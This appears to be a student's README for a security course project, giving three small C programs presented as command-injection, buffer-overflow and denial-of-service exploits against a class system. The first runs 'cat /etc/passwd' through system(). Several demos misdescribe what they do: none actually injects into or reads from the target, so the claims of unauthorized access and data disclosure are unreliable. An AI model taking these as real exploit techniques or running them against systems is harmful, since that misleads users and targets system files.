# csci4271-proj1
Project 1 from class CSCI 4271W

Exploit 1: Elevation of Privilege - Command Injection (Sync Cloud)

- Consider this code to be in a file called cmd_injection.c

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main() {
    char cmdstring[256];
    snprintf(cmdstring, sizeof(cmdstring), "echo 'Injecting command...' && cat /etc/passwd");

    system(cmdstring);
    return 0;
}

- Compile the file:
 gcc -o cmd_injection cmd_injection.c
 - Run the compiled file:
 ./cmd_injection
 - Expectation: The output will include the contents of /etc/passwd, indicating unauthorized access to system files.


Exploit 2: Information Disclosure - Buffer Overflow in list_sites

 - Consider this code to be in a file called buff_overflow.c

#include <stdio.h>
#include <stdlib.h>
#include <string.h>


int main() {
    char site_name[300];
    for(int i = 0; i < 299; i++) {
        site_name[i] = 'a'; 
    }

    site_name[299] = '\0';
    char str[256];

    strcpy(str, site_name);
    return 0;
}

- Compile the file:
 gcc -o buff_overflow buff_overflow.c
 - Run the compiled file:
 ./buff_overflow
 - Expectations: The output will simulate what happens when an oversized site name is processed, buffer overflow potentially revealing sensitive data or causing a segmentation fault, showing the   vulnerability.



Exploit 3: Denial of Service - JSON File Overflow (Add Site Rules)

Supposed the code is from a file called overflow

#include <stdio.h>
#include <stdlib.h>

#define LARGE 1000000 

int main() {
    FILE *f = fopen("large_rule.json", "w");
    if (f == NULL) {
        return 1;
    }
    
    fprintf(f, "\n");
    for (int i = 0; i < LARGE; i++) {
        fprintf(f, "\"rule%d\": \"Muahahahahahahahahahahahahahaha\",\n", i);
    }
    fprintf(f, "\n");
    
    fclose(f);
    return 0;
}


- Compile the file:
 gcc -o overflow overflow.c
 - Run the compiled file:
 ./overflow
 - Expectations: When the BCPWM system processes this file, it will potentially crash, demonstrating a Denial of Service.
